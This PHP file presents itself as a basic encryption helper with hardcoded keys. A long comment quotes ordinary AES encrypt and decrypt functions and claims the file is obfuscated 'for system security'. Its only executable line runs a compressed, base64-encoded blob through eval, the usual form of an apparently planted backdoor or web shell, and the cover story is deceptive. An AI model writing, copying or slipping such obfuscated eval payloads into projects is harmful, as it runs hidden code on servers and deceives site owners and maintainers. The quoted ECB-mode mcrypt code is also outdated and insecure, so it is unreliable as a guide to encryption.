<?php

/* 
Basic Encryption using built in keys. Sorry, but this code needs to be encrypted for system security.
This is about serious encryption and decryption!

This file may change from version to version. However, the call function and the inputs needed will be the same.
80% of the cause for changing this file is that the built-in encryption keys needs to be updated regularly.


For those that is curious what this file is based on:

This function is based on the PHP encryption function. Search for "PHP Encryption functions" for more info.
The code is modified from its original function, by changing the key-input system.
Instead of recieving the data as (data, key), the modified function uses the built-in key hardcoded into this file instead.
This is the reason why the file is encrypted. However, some folks with enough base64 knowledges might be able to break into this.

Here's the original code :

function mysql_aes_decrypt($val,$ky) 
{ 
    $key="\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"; 
    for($a=0;$a<strlen($ky);$a++) 
      $key[$a%16]=chr(ord($key[$a%16]) ^ ord($ky[$a])); 
    $mode = MCRYPT_MODE_ECB; 
    $enc = MCRYPT_RIJNDAEL_128; 
    $dec = @mcrypt_decrypt($enc, $key, $val, $mode, @mcrypt_create_iv( @mcrypt_get_iv_size($enc, $mode), MCRYPT_DEV_URANDOM ) ); 
    return rtrim($dec,(( ord(substr($dec,strlen($dec)-1,1))>=0 and ord(substr($dec, strlen($dec)-1,1))<=16)? chr(ord( substr($dec,strlen($dec)-1,1))):null)); 
} 

function mysql_aes_encrypt($val,$ky) 
{ 
    $key="\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"; 
    for($a=0;$a<strlen($ky);$a++) 
      $key[$a%16]=chr(ord($key[$a%16]) ^ ord($ky[$a])); 
    $mode=MCRYPT_MODE_ECB; 
    $enc=MCRYPT_RIJNDAEL_128; 
    $val=str_pad($val, (16*(floor(strlen($val) / 16)+(strlen($val) % 16==0?2:1))), chr(16-(strlen($val) % 16))); 
    return mcrypt_encrypt($enc, $key, $val, $mode, mcrypt_create_iv( mcrypt_get_iv_size($enc, $mode), MCRYPT_DEV_URANDOM)); 
} 


*/

/* There are two functions available in this code :

- mysql_aes_decrypt
- mysql_aes_encrypt
both takes the input as the data.


*/

eval(gzinflate(base64_decode('1VJdT8IwFH0n4T80ZCStjLgRsyBQkY89YAQMURM/sKlbkcnYsBskaPzvXjY21CkPvrmly3ruubf3np7cZOlZoeN7aL4OXlzGRcBsYcn1IsTKirsE5XNvsJTZmhamx/yo54+fh/y2ak6q7UI9n0PwKDMB0Xtt/1uoo5g+8SVWONXqCm8EoXSFh6E8gW2pRLacuOidwou6MabWVGJf2vgTRtADiqENMiYkqa7MfVsgivqd0c3FJesPuyYzO+00LDxrFx31zgbdlnnO9Eo1ZcD8wDidRyrs1IBENeoKvqCMGp+kpkRLCh4K5qxwCj2JEPYscF5Fkr/JIWpyfte8Zlej1qA77COC0hmkCJfSQzKUzhxv+lExjqYNlo+gWAwl0sE/KeuqTsgJ1RD37AwTZakNqhukiRJh0f7CpOYtXTfW+B1WPveDbWC+/24busc0dJ9lYGQKPbEFt3FsDqwbB3ji+tB00mykyyEC4UtfsSJglGrNSm2jtRrdim6UsyRCvltka7RU+99MmvXoHyy6M8AH')));
?>
